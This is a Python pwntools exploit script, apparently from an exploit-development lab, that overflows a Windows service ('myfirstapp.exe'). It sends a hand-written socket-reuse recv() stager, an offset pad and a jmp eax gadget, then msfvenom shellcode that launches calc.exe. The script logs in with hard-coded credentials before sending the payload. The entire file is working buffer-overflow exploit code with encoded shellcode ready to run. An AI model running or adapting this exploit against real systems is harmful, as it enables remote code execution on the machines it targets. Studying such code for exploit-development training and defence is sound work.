#!/usr/bin/python3
from pwn import sys, log, remote, p32, asm, sleep

if len(sys.argv) != 2:
    log.failure(f"Usage: python3 {sys.argv[0]} <port>")
    sys.exit(1)

"""
int recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);
"""

recv  = b""
recv += asm("mov esi, dword ptr [esp + 0x48]") # save socket descriptor in $esi
recv += asm("sub esp, 0x64")                   # sub esp to avoid overwriting
recv += asm("xor ebx, ebx")                    # convert $ebx to 0x0
recv += asm("push ebx")                        # push argument (flags)
recv += asm("add bh, 0x4")                     # convert $ebx to 0x400
recv += asm("push ebx")                        # push argument (len)
recv += asm("mov ebx, esp")                    # convert $ebx in $esp
recv += asm("add bx, 0x64")                    # add 0x64 to $ebx
recv += asm("push ebx")                        # push argument (*buf)
recv += asm("push esi")                        # push argument (s)
recv += asm("mov eax, dword ptr [0x719082ac]") # save recv() in $eax
recv += asm("call eax")                        # call $eax with the arguments

# !py mona pattern_offset eip
offset = 66
junk = b"A" * (offset - len(recv))

# !py mona jmp -r eax -m myfirstapp.exe
jmpeax = p32(0x719023b3)

payload = recv + junk + jmpeax

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00'
shellcode =  b""
shellcode += b"\xbb\x03\x3b\xba\x85\xdb\xca\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x31\x83\xea\xfc\x31\x5a\x0f"
shellcode += b"\x03\x5a\x0c\xd9\x4f\x79\xfa\x9f\xb0\x82\xfa"
shellcode += b"\xff\x39\x67\xcb\x3f\x5d\xe3\x7b\xf0\x15\xa1"
shellcode += b"\x77\x7b\x7b\x52\x0c\x09\x54\x55\xa5\xa4\x82"
shellcode += b"\x58\x36\x94\xf7\xfb\xb4\xe7\x2b\xdc\x85\x27"
shellcode += b"\x3e\x1d\xc2\x5a\xb3\x4f\x9b\x11\x66\x60\xa8"
shellcode += b"\x6c\xbb\x0b\xe2\x61\xbb\xe8\xb2\x80\xea\xbe"
shellcode += b"\xc9\xda\x2c\x40\x1e\x57\x65\x5a\x43\x52\x3f"
shellcode += b"\xd1\xb7\x28\xbe\x33\x86\xd1\x6d\x7a\x27\x20"
shellcode += b"\x6f\xba\x8f\xdb\x1a\xb2\xec\x66\x1d\x01\x8f"
shellcode += b"\xbc\xa8\x92\x37\x36\x0a\x7f\xc6\x9b\xcd\xf4"
shellcode += b"\xc4\x50\x99\x53\xc8\x67\x4e\xe8\xf4\xec\x71"
shellcode += b"\x3f\x7d\xb6\x55\x9b\x26\x6c\xf7\xba\x82\xc3"
shellcode += b"\x08\xdc\x6d\xbb\xac\x96\x83\xa8\xdc\xf4\xc9"
shellcode += b"\x2f\x52\x83\xbf\x30\x6c\x8c\xef\x58\x5d\x07"
shellcode += b"\x60\x1e\x62\xc2\xc5\xd0\x28\x4f\x6f\x79\xf5"
shellcode += b"\x05\x32\xe4\x06\xf0\x70\x11\x85\xf1\x08\xe6"
shellcode += b"\x95\x73\x0d\xa2\x11\x6f\x7f\xbb\xf7\x8f\x2c"
shellcode += b"\xbc\xdd\xf3\xb3\x2e\xbd\xdd\x56\xd7\x24\x22"

shell = remote("Windows", sys.argv[1])

shell.sendlineafter(b"Username: ", b"alfiansyah")
shell.sendlineafter(b"Password: ", b"K3r4j@@nM4j@pAh!T")
shell.sendlineafter(b"FullName: ", b"Vickry Alfiansyah")
shell.sendlineafter(b"Input Your Code: ", payload)

sleep(1)
shell.sendline(shellcode)
